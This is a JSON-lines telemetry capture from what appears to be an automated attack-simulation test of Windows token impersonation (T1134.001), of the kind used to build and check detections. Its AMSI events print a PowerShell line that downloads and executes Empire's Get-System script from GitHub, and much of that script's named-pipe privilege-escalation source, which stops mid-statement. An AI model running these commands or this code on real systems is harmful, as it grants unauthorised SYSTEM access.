{"evt_type":"R","ts":1697145880881089900,"evt_reg":{"event_type":"SETVALUEKEY","pid":3060,"key_name":"\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Services\\W32Time\\Config","value_name":"LastKnownGoodTime"}}
{"evt_type":"P","ts":1697145880881089900,"evt_process":{"cmdline":"C:\\Program Files\\Git\\usr\\bin\\bash.exe --login -i","pid":12172,"parent_pid":8308,"exe_path":"\\Device\\HarddiskVolume4\\Program Files\\Git\\usr\\bin\\bash.exe","unique_pid":"3940649673969393","parent_unique_pid":"3940649673949877"}}
{"evt_type":"F","ts":1697145880943188700,"evt_file":{"action":"CREATE","exit_code":0,"target_path":"\\\\.\\pipe\\msys-1888ae32e00d56aa-12172-sigwait"}}
{"evt_type":"H","ts":1697145881005614900,"evt_api":{"pid":12172,"unique_pid":"3940649673969393","funcion_called":"KiUserApcDispatcher","was_operation_successful":true,"parameter_names":"SystemArg1;SystemArg2;SystemArg3;APCRoutine","parameter_values":"0X210044E50;0X21023A860;0X0;0X7FFF774AF1F0"}}
{"evt_type":"P","ts":1697145881021237200,"evt_process":{"cmdline":"\\\\?\\C:\\Windows\\system32\\conhost.exe --headless --inheritcursor --width 253 --height 77 --signal 0x268 --server 0x258","pid":10852,"parent_pid":12172,"exe_path":"\\Device\\HarddiskVolume4\\Windows\\System32\\conhost.exe","unique_pid":"3940649673969394","parent_unique_pid":"3940649673969393"}}
{"evt_type":"P","ts":1697145881021237200,"evt_process":{"cmdline":"\\\\?\\C:\\Program Files\\Git\\usr\\bin\\cygwin-console-helper.exe 0x36C 0x254 0x268","pid":10268,"parent_pid":12172,"exe_path":"\\Device\\HarddiskVolume4\\Program Files\\Git\\usr\\bin\\cygwin-console-helper.exe","unique_pid":"3940649673969395","parent_unique_pid":"3940649673969393"}}
{"evt_type":"P","ts":1697145881146243500,"evt_process":{"cmdline":"\\\\?\\C:\\Program Files\\Git\\usr\\bin\\cygwin-console-helper.exe 0x36C 0x254 0x268","pid":10268,"parent_pid":12172,"exe_path":"\\Device\\HarddiskVolume4\\Program Files\\Git\\usr\\bin\\cygwin-console-helper.exe","unique_pid":"3940649673969395","parent_unique_pid":"3940649673969393"}}
{"evt_type":"P","ts":1697145881161868000,"evt_process":{"cmdline":"C:\\atomic-test\\atomic-harness\\bin\\atomic-harness --telemetrytoolpath=bin/telemtool.exe T1134.001#1","pid":11128,"parent_pid":12172,"exe_path":"\\Device\\HarddiskVolume4\\atomic-test\\atomic-harness\\bin\\atomic-harness","unique_pid":"3940649673969396","parent_unique_pid":"3940649673969393"}}
{"evt_type":"F","ts":1697145881280497500,"evt_file":{"action":"CREATE","exit_code":0,"target_path":"\\Device\\HarddiskVolume4\\atomic-test\\atomic-harness\\testruns\\harness-results-3520744085"}}
{"evt_type":"P","ts":1697145881288853700,"evt_process":{"cmdline":"bin\\telemtool.exe --prepare  --resultsdir .\\testruns\\harness-results-3520744085 --suffix ''","pid":7484,"parent_pid":11128,"exe_path":"\\Device\\HarddiskVolume4\\atomic-test\\atomic-harness\\bin\\telemtool.exe","unique_pid":"3940649673969397","parent_unique_pid":"3940649673969396"}}
{"evt_type":"P","ts":1697145881335275700,"evt_process":{"cmdline":"bin\\telemtool.exe --prepare  --resultsdir .\\testruns\\harness-results-3520744085 --suffix ''","pid":7484,"parent_pid":11128,"exe_path":"\\Device\\HarddiskVolume4\\atomic-test\\atomic-harness\\bin\\telemtool.exe","unique_pid":"3940649673969397","parent_unique_pid":"3940649673969396"}}
{"evt_type":"F","ts":1697145881356660300,"evt_file":{"action":"CREATE","exit_code":0,"target_path":"\\Device\\HarddiskVolume4\\atomic-test\\atomic-harness\\testruns\\harness-results-3520744085\\T1134.001_1_90db9e27"}}
{"evt_type":"F","ts":1697145881360486600,"evt_file":{"action":"CREATE","exit_code":0,"target_path":"\\Device\\HarddiskVolume4\\Users\\quantumuser\\AppData\\Local\\Temp\\artwork-T1134.001_1-2307143491"}}
{"evt_type":"F","ts":1697145881366400800,"evt_file":{"action":"CREATE","exit_code":0,"target_path":"\\Device\\HarddiskVolume4\\atomic-test\\atomic-harness\\testruns\\harness-results-3520744085\\status.json"}}
{"evt_type":"F","ts":1697145881366400800,"evt_file":{"action":"?","exit_code":0,"target_path":"\\Device\\HarddiskVolume4\\atomic-test\\atomic-harness\\testruns\\harness-results-3520744085\\status.json"}}
{"evt_type":"F","ts":1697145881366640100,"evt_file":{"action":"CREATE","exit_code":0,"target_path":"\\Device\\HarddiskVolume4\\atomic-test\\atomic-harness\\testruns\\harness-results-3520744085\\status.json"}}
{"evt_type":"F","ts":1697145881367183700,"evt_file":{"action":"CREATE","exit_code":0,"target_path":"\\Device\\HarddiskVolume4\\atomic-test\\atomic-harness\\testruns\\harness-results-3520744085\\status.txt"}}
{"evt_type":"F","ts":1697145881367183700,"evt_file":{"action":"?","exit_code":0,"target_path":"\\Device\\HarddiskVolume4\\atomic-test\\atomic-harness\\testruns\\harness-results-3520744085\\status.txt"}}
{"evt_type":"F","ts":1697145881367183700,"evt_file":{"action":"CREATE","exit_code":0,"target_path":"\\Device\\HarddiskVolume4\\atomic-test\\atomic-harness\\testruns\\harness-results-3520744085\\status.txt"}}
{"evt_type":"P","ts":1697145881369968300,"evt_process":{"cmdline":"C:\\atomic-test\\atomic-harness\\bin\\goartrun.exe --config .\\testruns\\harness-results-3520744085\\T1134.001_1_90db9e27\\runspec.json","pid":9636,"parent_pid":11128,"exe_path":"\\Device\\HarddiskVolume4\\atomic-test\\atomic-harness\\bin\\goartrun.exe","unique_pid":"3940649673969398","parent_unique_pid":"3940649673969396"}}
{"evt_type":"F","ts":1697145881420608500,"evt_file":{"action":"CREATE","exit_code":0,"target_path":"\\Device\\HarddiskVolume4\\atomic-test\\atomic-harness\\testruns\\harness-results-3520744085\\T1134.001_1_90db9e27\\runspec.json"}}
{"evt_type":"F","ts":1697145881420608500,"evt_file":{"action":"?","exit_code":0,"target_path":"\\Device\\HarddiskVolume4\\atomic-test\\atomic-harness\\testruns\\harness-results-3520744085\\T1134.001_1_90db9e27\\runspec.json"}}
{"evt_type":"P","ts":1697145881443283900,"evt_process":{"cmdline":"\\Device\\HarddiskVolume4\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe POWERSHELL -ExecutionPolicy Bypass -NoProfile C:\\Users\\QUANTU~1\\AppData\\Local\\Temp\\artwork-T1134.001_1-2307143491\\goart-T1134.001-test.ps1","pid":12216,"parent_pid":9636,"exe_path":"\\Device\\HarddiskVolume4\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","unique_pid":"3940649673969399","parent_unique_pid":"3940649673969398"}}
{"evt_type":"f","ts":1697145881911861900,"evt_file":{"action":"OPEN_READ","exit_code":0,"target_path":"\\Device\\HarddiskVolume4\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe.config"}}
{"evt_type":"f","ts":1697145881911861900,"evt_file":{"action":"OPEN_READ","exit_code":0,"target_path":"\\Device\\HarddiskVolume4\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Config\\machine.config"}}
{"evt_type":"H","ts":1697145881911861900,"evt_api":{"pid":12216,"unique_pid":"3940649673969399","funcion_called":"CoCreateInstance","was_operation_successful":true,"parameter_names":"rclsid;CLSIDName;riid;IIDName","parameter_values":"{00000323-0000-0000-C000-000000000046};;{00000146-0000-0000-C000-000000000046};"}}
{"evt_type":"f","ts":1697145881958742700,"evt_file":{"action":"OPEN_READ","exit_code":0,"target_path":"\\Device\\HarddiskVolume4\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\Microsoft.PowerShell.Utility\\Microsoft.PowerShell.Utility.psm1"}}
{"evt_type":"f","ts":1697145882005650300,"evt_file":{"action":"OPEN_READ","exit_code":0,"target_path":"\\Device\\HarddiskVolume4\\Users\\quantumuser\\AppData\\Local\\Temp\\__PSScriptPolicyTest_afzqnlpn.fua.ps1"}}
{"evt_type":"F","ts":1697145882021236700,"evt_file":{"action":"CREATE","exit_code":0,"target_path":"\\Device\\HarddiskVolume4\\Users\\quantumuser\\AppData\\Local\\Temp\\__PSScriptPolicyTest_afzqnlpn.fua.ps1"}}
{"evt_type":"F","ts":1697145882021236700,"evt_file":{"action":"?","exit_code":0,"target_path":"\\Device\\HarddiskVolume4\\Users\\quantumuser\\AppData\\Local\\Temp\\__PSScriptPolicyTest_afzqnlpn.fua.ps1"}}
{"evt_type":"F","ts":1697145882036863400,"evt_file":{"action":"DELETE","exit_code":0,"target_path":"\\Device\\HarddiskVolume4\\Users\\quantumuser\\AppData\\Local\\Temp\\__PSScriptPolicyTest_afzqnlpn.fua.ps1"}}
{"evt_type":"F","ts":1697145882036863400,"evt_file":{"action":"CREATE","exit_code":0,"target_path":"\\Device\\HarddiskVolume4\\Users\\quantumuser\\AppData\\Local\\Temp\\__PSScriptPolicyTest_mgxnvcu0.n1b.psm1"}}
{"evt_type":"F","ts":1697145882036863400,"evt_file":{"action":"?","exit_code":0,"target_path":"\\Device\\HarddiskVolume4\\Users\\quantumuser\\AppData\\Local\\Temp\\__PSScriptPolicyTest_mgxnvcu0.n1b.psm1"}}
{"evt_type":"f","ts":1697145882036863400,"evt_file":{"action":"OPEN_READ","exit_code":0,"target_path":"\\Device\\HarddiskVolume4\\Users\\quantumuser\\AppData\\Local\\Temp\\__PSScriptPolicyTest_mgxnvcu0.n1b.psm1"}}
{"evt_type":"F","ts":1697145882036863400,"evt_file":{"action":"DELETE","exit_code":0,"target_path":"\\Device\\HarddiskVolume4\\Users\\quantumuser\\AppData\\Local\\Temp\\__PSScriptPolicyTest_mgxnvcu0.n1b.psm1"}}
{"evt_type":"f","ts":1697145882036863400,"evt_file":{"action":"OPEN_READ","exit_code":0,"target_path":"\\Device\\HarddiskVolume4\\Windows\\System32\\CatRoot"}}
{"evt_type":"f","ts":1697145882036863400,"evt_file":{"action":"OPEN_READ","exit_code":0,"target_path":"\\Device\\HarddiskVolume4\\Windows\\System32\\catroot2"}}
{"evt_type":"f","ts":1697145882052487300,"evt_file":{"action":"OPEN_READ","exit_code":0,"target_path":"\\Device\\HarddiskVolume4\\Windows\\System32\\CatRoot\\{F750E6C3-38EE-11D1-85E5-00C04FC295EE}\\Microsoft-Windows-Client-Features-Package0313~31bf3856ad364e35~amd64~~10.0.19041.3324.cat"}}
{"evt_type":"f","ts":1697145882083739000,"evt_file":{"action":"OPEN_READ","exit_code":0,"target_path":"\\Device\\HarddiskVolume4\\Users\\quantumuser\\AppData\\Local\\Microsoft\\Windows\\PowerShell\\StartupProfileData-NonInteractive"}}
{"evt_type":"F","ts":1697145882114990100,"evt_file":{"action":"CREATE","exit_code":0,"target_path":"\\\\.\\pipe\\PSHost.133416194814487557.12216.DefaultAppDomain.powershell"}}
{"evt_type":"F","ts":1697145882224370500,"evt_file":{"action":"CREATE","exit_code":0,"target_path":"\\Device\\HarddiskVolume4\\Users\\quantumuser\\AppData\\Local\\Temp\\artwork-T1134.001_1-2307143491\\goart-T1134.001-test.ps1"}}
{"evt_type":"F","ts":1697145882224370500,"evt_file":{"action":"?","exit_code":0,"target_path":"\\Device\\HarddiskVolume4\\Users\\quantumuser\\AppData\\Local\\Temp\\artwork-T1134.001_1-2307143491\\goart-T1134.001-test.ps1"}}
{"evt_type":"f","ts":1697145882224370500,"evt_file":{"action":"OPEN_READ","exit_code":0,"target_path":"\\Device\\HarddiskVolume4\\Users\\quantumuser\\AppData\\Local\\Temp\\artwork-T1134.001_1-2307143491\\goart-T1134.001-test.ps1"}}
{"evt_type":"f","ts":1697145882240010900,"evt_file":{"action":"OPEN_READ","exit_code":0,"target_path":"\\Device\\HarddiskVolume4\\Windows\\System32\\catroot2\\dberr.txt"}}
{"evt_type":"f","ts":1697145882255614600,"evt_file":{"action":"OPEN_READ","exit_code":0,"target_path":"\\Device\\HarddiskVolume4\\Users\\quantumuser\\AppData\\Local\\Microsoft\\Windows\\PowerShell\\ModuleAnalysisCache"}}
{"evt_type":"H","ts":1697145882255614600,"evt_api":{"pid":12216,"unique_pid":"3940649673969399","funcion_called":"KiUserApcDispatcher","was_operation_successful":true,"parameter_names":"SystemArg1;SystemArg2;SystemArg3;APCRoutine","parameter_values":"0X7FFF67D1A380;0X29C7499CE40;0X0;0X7FFF774AF1F0"}}
{"evt_type":"I","ts":1697145882208736700,"evt_amsi":{"scan_content":"C:\\Users\\QUANTU~1\\AppData\\Local\\Temp\\artwork-T1134.001_1-2307143491\\goart-T1134.001-test.ps1 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/BC-SECURITY/Empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/Get-System.ps1' -UseBasicParsing); Get-System -Technique NamedPipe -Verbose","pid":12216,"app_name":"PowerShell_C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\POWERSHELL.exe_10.0.19041.1"}}
{"evt_type":"f","ts":1697145882276739400,"evt_file":{"action":"OPEN_READ","exit_code":0,"target_path":"\\Device\\HarddiskVolume4\\Windows\\System32\\WindowsPowerShell\\v1.0\\Modules\\Microsoft.PowerShell.Utility\\Microsoft.PowerShell.Utility.psd1"}}
{"evt_type":"H","ts":1697145882443109100,"evt_api":{"pid":12216,"unique_pid":"3940649673969399","funcion_called":"KiUserApcDispatcher","was_operation_successful":true,"parameter_names":"SystemArg1;SystemArg2;SystemArg3;APCRoutine","parameter_values":"0X0\u0000C74A40B60;0X0;0X7;0X7FFF75F9DED0"}}
{"evt_type":"N","ts":1697145882474364300,"evt_netflow":{"flow_str":"tcp:10.0.0.6:61994-\u003e185.199.111.133:443","pid":12216}}
{"evt_type":"F","ts":1697145882661857800,"evt_file":{"action":"?","exit_code":0,"target_path":"\\Device\\HarddiskVolume4\\Users\\quantumuser\\AppData\\Local\\Temp\\__PSScriptPolicyTest_afzqnlpn.fua.ps1"}}
{"evt_type":"F","ts":1697145882661857800,"evt_file":{"action":"?","exit_code":0,"target_path":"\\Device\\HarddiskVolume4\\Users\\quantumuser\\AppData\\Local\\Temp\\__PSScriptPolicyTest_mgxnvcu0.n1b.psm1"}}
{"evt_type":"F","ts":1697145883318113300,"evt_file":{"action":"CREATE","exit_code":0,"target_path":"\\\\.\\pipe\\TestSVC"}}
{"evt_type":"R","ts":1697145883570381900,"evt_reg":{"event_type":"SETVALUEKEY","pid":712,"key_name":"\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Services\\TestSVC","value_name":"Type"}}
{"evt_type":"R","ts":1697145883570381900,"evt_reg":{"event_type":"CREATEKEY","pid":712,"key_name":"\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Services\\TestSVC"}}
{"evt_type":"R","ts":1697145883570381900,"evt_reg":{"event_type":"SETVALUEKEY","pid":712,"key_name":"\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Services\\TestSVC","value_name":"Start"}}
{"evt_type":"R","ts":1697145883570381900,"evt_reg":{"event_type":"SETVALUEKEY","pid":712,"key_name":"\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Services\\TestSVC","value_name":"ErrorControl"}}
{"evt_type":"R","ts":1697145883570381900,"evt_reg":{"event_type":"SETVALUEKEY","pid":712,"key_name":"\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Services\\TestSVC","value_name":"ImagePath"}}
{"evt_type":"R","ts":1697145883570381900,"evt_reg":{"event_type":"SETVALUEKEY","pid":712,"key_name":"\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Services\\TestSVC","value_name":"DisplayName"}}
{"evt_type":"R","ts":1697145883570381900,"evt_reg":{"event_type":"SETVALUEKEY","pid":712,"key_name":"\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Services\\TestSVC","value_name":"ObjectName"}}
{"evt_type":"P","ts":1697145883592240000,"evt_process":{"cmdline":"C:\\Windows\\system32\\cmd.exe /C start C:\\Windows\\system32\\cmd.exe /C timeout /t 3 \u003enul\u0026\u0026echo TestSVC \u003e \\\\.\\pipe\\TestSVC","pid":9436,"parent_pid":712,"exe_path":"\\Device\\HarddiskVolume4\\Windows\\System32\\cmd.exe","unique_pid":"3940649673969400","parent_unique_pid":"3940649673949195"}}
{"evt_type":"P","ts":1697145883607899700,"evt_process":{"cmdline":"C:\\Windows\\system32\\cmd.exe /C timeout /t 3 \u003enul\u0026\u0026echo TestSVC \u003e \\\\.\\pipe\\TestSVC","pid":6820,"parent_pid":9436,"exe_path":"\\Device\\HarddiskVolume4\\Windows\\System32\\cmd.exe","unique_pid":"3940649673969401","parent_unique_pid":"3940649673969400"}}
{"evt_type":"P","ts":1697145883607899700,"evt_process":{"cmdline":"C:\\Windows\\system32\\cmd.exe /C start C:\\Windows\\system32\\cmd.exe /C timeout /t 3 \u003enul\u0026\u0026echo TestSVC \u003e \\\\.\\pipe\\TestSVC","pid":9436,"parent_pid":712,"exe_path":"\\Device\\HarddiskVolume4\\Windows\\System32\\cmd.exe","unique_pid":"3940649673969400","parent_unique_pid":"3940649673949195"}}
{"evt_type":"P","ts":1697145883623536700,"evt_process":{"cmdline":"\\??\\C:\\Windows\\system32\\conhost.exe 0xffffffff -ForceV1","pid":8304,"parent_pid":6820,"exe_path":"\\Device\\HarddiskVolume4\\Windows\\System32\\conhost.exe","unique_pid":"3940649673969402","parent_unique_pid":"3940649673969401"}}
{"evt_type":"R","ts":1697145883667890200,"evt_reg":{"event_type":"SETVALUEKEY","pid":1248,"key_name":"\\REGISTRY\\USER\\S-1-5-20\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\DeliveryOptimization\\Config","value_name":"DownloadMode_BackCompat"}}
{"evt_type":"R","ts":1697145883667890200,"evt_reg":{"event_type":"SETVALUEKEY","pid":1248,"key_name":"\\REGISTRY\\USER\\S-1-5-20\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\DeliveryOptimization\\Config","value_name":"DODownloadMode"}}
{"evt_type":"H","ts":1697145883678069100,"evt_api":{"pid":8304,"unique_pid":"3940649673969402","funcion_called":"CoCreateInstance","was_operation_successful":true,"parameter_names":"rclsid;CLSIDName;riid;IIDName","parameter_values":"{529A9E6B-6587-4F23-AB9E-9C7D683E3C50};TF_ThreadMgr;{3E90ADE3-7594-4CB0-BB58-69628F5F458C};ITfThreadMgrEx"}}
{"evt_type":"H","ts":1697145883678069100,"evt_api":{"pid":8304,"unique_pid":"3940649673969402","funcion_called":"CoCreateInstance","was_operation_successful":true,"parameter_names":"rclsid;CLSIDName;riid;IIDName","parameter_values":"{33C53A50-F456-4884-B049-85FD643ECFED};TF_InputProcessorProfiles;{71C6E74C-0F28-11D8-A82A-00065B84435C};ITfInputProcessorProfileMgr"}}
{"evt_type":"P","ts":1697145883693716400,"evt_process":{"cmdline":"timeout /t 3","pid":12832,"parent_pid":6820,"exe_path":"\\Device\\HarddiskVolume4\\Windows\\System32\\timeout.exe","unique_pid":"3940649673969403","parent_unique_pid":"3940649673969401"}}
{"evt_type":"F","ts":1697145884241259600,"evt_file":{"action":"CREATE","exit_code":0,"target_path":"\\Device\\HarddiskVolume4\\Users\\quantumuser\\AppData\\Roaming\\Code\\Network\\87069184-a865-44b7-8576-35465b5435a9.tmp"}}
{"evt_type":"F","ts":1697145884241259600,"evt_file":{"action":"?","exit_code":0,"target_path":"\\Device\\HarddiskVolume4\\Users\\quantumuser\\AppData\\Roaming\\Code\\Network\\87069184-a865-44b7-8576-35465b5435a9.tmp"}}
{"evt_type":"F","ts":1697145884241259600,"evt_file":{"action":"CREATE","exit_code":0,"target_path":"\\Device\\HarddiskVolume4\\Users\\quantumuser\\AppData\\Roaming\\Code\\Network\\TransportSecurity~RF1fc9712e.TMP"}}
{"evt_type":"F","ts":1697145884241259600,"evt_file":{"action":"?","exit_code":0,"target_path":"\\Device\\HarddiskVolume4\\Users\\quantumuser\\AppData\\Roaming\\Code\\Network\\2f626618-749d-4fd2-bc3c-a06df68449ff.tmp"}}
{"evt_type":"F","ts":1697145884241259600,"evt_file":{"action":"DELETE","exit_code":0,"target_path":"\\Device\\HarddiskVolume4\\Users\\quantumuser\\AppData\\Roaming\\Code\\Network\\2f626618-749d-4fd2-bc3c-a06df68449ff.tmp"}}
{"evt_type":"E","ts":1697145880008588500,"evt_etw":{"chan_name":"Microsoft-Windows-PowerShell/Operational ","event_msg":"Creating Scriptblock text (%1 of %2):\r\n%3\r\n\r\nScriptBlock ID: %4\r\nPath: %5 ","event_data_list":"MessageNumber:1 MessageTotal:1 ScriptBlockText:{ $_.GlobalAssemblyCache -And $_.Location.Split('\\\\')[-1].Equals('System.dll') } ScriptBlockId:fbcfb3bb-7638-4568-a942-ee62dbb23c72 Path: ","pid":12216}}
{"evt_type":"R","ts":1697145884649007500,"evt_reg":{"event_type":"SETVALUEKEY","pid":712,"key_name":"\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Services\\TestSVC","value_name":"DeleteFlag"}}
{"evt_type":"R","ts":1697145884649007500,"evt_reg":{"event_type":"SETVALUEKEY","pid":712,"key_name":"\\REGISTRY\\MACHINE\\SYSTEM\\ControlSet001\\Services\\TestSVC","value_name":"Start"}}
{"evt_type":"R","ts":1697145884656023800,"evt_reg":{"event_type":"DELETEKEY","pid":712,"key_name":"\\REGISTRY\\MACHINE\\SYSTEM\\CONTROLSET001\\SERVICES\\TESTSVC"}}
{"evt_type":"I","ts":1697145883224364300,"evt_amsi":{"scan_content":"function Get-System {\n\u003c#\n    .SYNOPSIS\n\n        GetSystem functionality inspired by Meterpreter's getsystem.\n        'NamedPipe' impersonation doesn't need SeDebugPrivilege but does create\n        a service, 'Token' duplications a SYSTEM token but needs SeDebugPrivilege.\n        NOTE: if running PowerShell 2.0, start powershell.exe with '-STA' to ensure\n        token duplication works correctly.\n\n        PowerSploit Function: Get-System\n        Author: @harmj0y, @mattifestation\n        License: BSD 3-Clause\n        Required Dependencies: None\n        Optional Dependencies: None\n\n    .PARAMETER Technique\n\n        The technique to use, 'NamedPipe' or 'Token'.\n\n    .PARAMETER ServiceName\n\n        The name of the service used with named pipe impersonation, defaults to 'TestSVC'.\n\n    .PARAMETER PipeName\n\n        The name of the named pipe used with named pipe impersonation, defaults to 'TestSVC'.\n\n    .PARAMETER RevToSelf\n    \n        Reverts the current thread privileges.\n\n    .PARAMETER WhoAmI\n\n        Switch. Display the credentials for the current PowerShell thread.\n\n    .EXAMPLE\n        \n        PS\u003e Get-System\n\n        Uses named impersonate to elevate the current thread token to SYSTEM.\n\n    .EXAMPLE\n        \n        PS\u003e Get-System -ServiceName 'PrivescSvc' -PipeName 'secret'\n\n        Uses named impersonate to elevate the current thread token to SYSTEM\n        with a custom service and pipe name.\n\n    .EXAMPLE\n        \n        PS\u003e Get-System -Technique Token\n\n        Uses token duplication to elevate the current thread token to SYSTEM.\n\n    .EXAMPLE\n        \n        PS\u003e Get-System -WhoAmI\n\n        Displays the credentials for the current thread.\n\n    .EXAMPLE\n        \n        PS\u003e Get-System -RevToSelf\n\n        Reverts the current thread privileges.\n\n    .LINK\n    \n        https://github.com/rapid7/meterpreter/blob/2a891a79001fc43cb25475cc43bced9449e7dc37/source/extensions/priv/server/elevate/namedpipe.c\n        https://github.com/obscuresec/shmoocon/blob/master/Invoke-TwitterBot\n        http://blog.cobaltstrike.com/2014/04/02/what-happens-when-i-type-getsystem/\n        http://clymb3r.wordpress.com/2013/11/03/powershell-and-token-impersonation/\n#\u003e\n    [CmdletBinding(DefaultParameterSetName = 'NamedPipe')]\n    param(\n        [Parameter(ParameterSetName = \"NamedPipe\")]\n        [Parameter(ParameterSetName = \"Token\")]\n        [String]\n        [ValidateSet(\"NamedPipe\", \"Token\")]\n        $Technique = 'NamedPipe',\n\n        [Parameter(ParameterSetName = \"NamedPipe\")]\n        [String]\n        $ServiceName = 'TestSVC',\n\n        [Parameter(ParameterSetName = \"NamedPipe\")]\n        [String]\n        $PipeName = 'TestSVC',\n\n        [Parameter(ParameterSetName = \"RevToSelf\")]\n        [Switch]\n        $RevToSelf,\n\n        [Parameter(ParameterSetName = \"WhoAmI\")]\n        [Switch]\n        $WhoAmI\n    )\n\n    $ErrorActionPreference = \"Stop\"\n\n    # from http://www.exploit-monday.com/2012/05/accessing-native-windows-api-in.html\n    function Local:Get-DelegateType\n    {\n        Param\n        (\n            [OutputType([Type])]\n            \n            [Parameter( Position = 0)]\n            [Type[]]\n            $Parameters = (New-Object Type[](0)),\n            \n            [Parameter( Position = 1 )]\n            [Type]\n            $ReturnType = [Void]\n        )\n\n        $Domain = [AppDomain]::CurrentDomain\n        $DynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')\n        $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)\n        $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)\n        $TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])\n        $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)\n        $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')\n        $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)\n        $MethodBuilder.SetImplementationFlags('Runtime, Managed')\n        \n        Write-Output $TypeBuilder.CreateType()\n    }\n\n    # from http://www.exploit-monday.com/2012/05/accessing-native-windows-api-in.html\n    function Local:Get-ProcAddress\n    {\n        Param\n        (\n            [OutputType([IntPtr])]\n        \n            [Parameter( Position = 0, Mandatory = $True )]\n            [String]\n            $Module,\n            \n            [Parameter( Position = 1, Mandatory = $True )]\n            [String]\n            $Procedure\n        )\n\n        # Get a reference to System.dll in the GAC\n        $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() |\n            Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\\\')[-1].Equals('System.dll') }\n        $UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')\n        # Get a reference to the GetModuleHandle and GetProcAddress methods\n        $GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')\n        $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String]))\n        # Get a handle to the module specified\n        $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))\n        $tmpPtr = New-Object IntPtr\n        $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)\n        \n        # Return the address of the function\n        Write-Output $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))\n    }\n\n    # performs named pipe impersonation to elevate to SYSTEM without needing\n    #   SeDebugPrivilege\n    function Local:Get-SystemNamedPipe {\n        param(\n            [String]\n            $ServiceName = \"TestSVC\",\n\n            [String]\n            $PipeName = \"TestSVC\"\n        )\n\n        $Command = \"%COMSPEC% /C start %COMSPEC% /C `\"timeout /t 3 \u003enul\u0026\u0026echo $PipeName \u003e \\\\.\\pipe\\$PipeName`\"\"\n\n        # create the named pipe used for impersonation and set appropriate permissions\n        $PipeSecurity = New-Object System.IO.Pipes.PipeSecurity\n        $AccessRule = New-Object System.IO.Pipes.PipeAccessRule( \"Everyone\", \"ReadWrite\", \"Allow\" )\n        $PipeSecurity.AddAccessRule($AccessRule)\n        $Pipe = New-Object System.IO.Pipes.NamedPipeServerStream($PipeName,\"InOut\",100, \"Byte\", \"None\", 1024, 1024, $PipeSecurity)\n\n        $PipeHandle = $Pipe.SafePipeHandle.DangerousGetHandle()\n\n        # Declare/setup all the needed API function\n        #   adapted heavily from http://www.exploit-monday.com/2012/05/accessing-native-windows-api-in.html \n        $ImpersonateNamedPipeClientAddr = Get-ProcAddress Advapi32.dll ImpersonateNamedPipeClient\n        $ImpersonateNamedPipeClientDelegate = Get-DelegateType @( [Int] ) ([Int])\n        $ImpersonateNamedPipeClient = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ImpersonateNamedPipeClientAddr, $ImpersonateNamedPipeClientDelegate)\n\n        $CloseServiceHandleAddr = Get-ProcAddress Advapi32.dll CloseServiceHandle\n        $CloseServiceHandleDelegate = Get-DelegateType @( [IntPtr] ) ([Int])\n        $CloseServiceHandle = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CloseServiceHandleAddr, $CloseServiceHandleDelegate)\n\n        $OpenSCManagerAAddr = Get-ProcAddress Advapi32.dll OpenSCManagerA\n        $OpenSCManagerADelegate = Get-DelegateType @( [String], [String], [Int]) ([IntPtr])\n        $OpenSCManagerA = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenSCManagerAAddr, $OpenSCManagerADelegate)\n        \n        $OpenServiceAAddr = Get-ProcAddress Advapi32.dll OpenServiceA\n        $OpenServiceADelegate = Get-DelegateType @( [IntPtr], [String], [Int]) ([IntPtr])\n        $OpenServiceA = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenServiceAAddr, $OpenServiceADelegate)\n      \n        $CreateServiceAAddr = Get-ProcAddress Advapi32.dll CreateServiceA\n        $CreateServiceADelegate = Get-DelegateType @( [IntPtr], [String], [String], [Int], [Int], [Int], [Int], [String], [String], [Int], [Int], [Int], [Int]) ([IntPtr])\n        $CreateServiceA = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateServiceAAddr, $CreateServiceADelegate)\n\n        $StartServiceAAddr = Get-ProcAddress Advapi32.dll StartServiceA\n        $StartServiceADelegate = 